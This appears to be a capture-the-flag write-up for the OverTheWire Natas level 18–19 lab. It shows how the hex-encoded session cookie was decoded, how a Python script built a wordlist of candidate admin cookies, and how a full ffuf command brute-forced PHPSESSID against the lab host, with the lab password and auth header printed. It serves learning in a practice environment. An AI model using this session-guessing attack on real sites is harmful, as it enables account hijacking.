# Level 18 - Level 19

```
Username: natas19
Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
URL:      http://natas19.natas.labs.overthewire.org
```

## Overview

This time we got the same login page that we got in the last level and its clearly mentioned that the source code is almost same, but the session id's will be random.

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

Let's first get the session id by trying to login with some random credentials.

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

***

## Decoding the Cookie

The session id we got was some random encoded string. I tried to decode the session id's by some basic encoding schemes in cyber chef and was able to decode the string using `From Hex` scheme.

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

The string that we got after decoding is `<id>-admin`.&#x20;

***

## Brute-forcing Session ID

Since we know all the possible id's, we can generate a word list of all possible `<id>-admin` sessions ids with Hex encoding. The wordlist can be generated using the following python script.

```python
#! /usr/bin/python

wordlist = open("hex_640.txt", "w")

cookies = [f"{i}-admin".encode("utf-8").hex() + "\n" for i in range(0, 641)]

wordlist.writelines(cookies)

wordlist.close()
```

Now we have successfully generated the word list by executing the above python script.

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

Now its time to use ffuf to brute-force the session id's.

{% code lineNumbers="true" %}
```python
ffuf -w hex_640.txt:FUZZ \
    -u $'http://natas19.natas.labs.overthewire.org/index.php' \
    -X $'POST' \
    -H $'Host: natas19.natas.labs.overthewire.org' \
    -H $'Content-Length: 31' -H $'Cache-Control: max-age=0' \
    -H $'Authorization: Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -H $'Origin: http://natas19.natas.labs.overthewire.org' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H $'Referer: http://natas19.natas.labs.overthewire.org/' \
    -H $'Accept-Encoding: gzip, deflate, br' \
    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -H $'Connection: close' \
    -b $'PHPSESSID=FUZZ' \
    -d $'username=admin&password=somoene' \
    -fr "You are logged in as a regular user."
```
{% endcode %}

From the results of `ffuf`, we can get the valid admin cookie.

<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

***

## Getting the Password

Now let's replace the session id with the id we found using ffuf and refresh the page to get the credentials for next level.

<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
